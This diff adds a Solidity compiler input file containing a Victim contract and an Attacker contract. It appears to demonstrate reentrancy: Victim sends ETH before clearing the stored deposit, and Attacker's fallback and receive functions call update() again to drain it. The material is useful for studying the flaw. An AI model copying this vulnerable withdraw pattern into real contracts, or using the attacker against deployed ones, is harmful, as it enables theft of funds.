@@ -1,0 +1,39 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Attacker.sol": {
+      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport \"./Victim.sol\";\n\ncontract Attacker{\n    Victim public victim = Victim(address(0));\n\n    fallback() external payable{\n        victim.update();\n    }\n\n    receive() external payable{\n        victim.update();\n    }\n\n    constructor(address _victim) payable{\n        victim = Victim(_victim);\n    }\n\n    function deposit() public{\n        victim.deposit{value: 1 ether}();\n    }\n\n    function attack() public{\n        victim.update();\n    }\n\n}"
+    },
+    "contracts/Victim.sol": {
+      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ncontract Victim{\n    mapping(address => uint) deposits;\n\n    constructor () payable{}\n\n    function deposit() public payable{\n        deposits[msg.sender] += msg.value;\n    }\n\n    function update() public{\n        uint value = deposits[msg.sender];\n        safeTransferETH(msg.sender, value);\n        deposits[msg.sender] = 0;\n    }\n\n    function getDeposit(address _account) public view returns(uint value){\n        value = deposits[_account];\n    }\n\n    function safeTransferETH(address _to, uint _value) internal{\n        (bool success, ) = _to.call{value: _value}(new bytes(0));\n        require(success, \"Transfer_Helper: ETH_TRANSFER_FAILED\");\n    }\n\n    function getBalance() public view returns(uint balance){\n        balance = address(this).balance;\n    }\n\n}"
+    }
+  },
+  "settings": {
+    "metadata": {
+      "bytecodeHash": "none",
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": true,
+      "runs": 800
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    }
+  }
+}
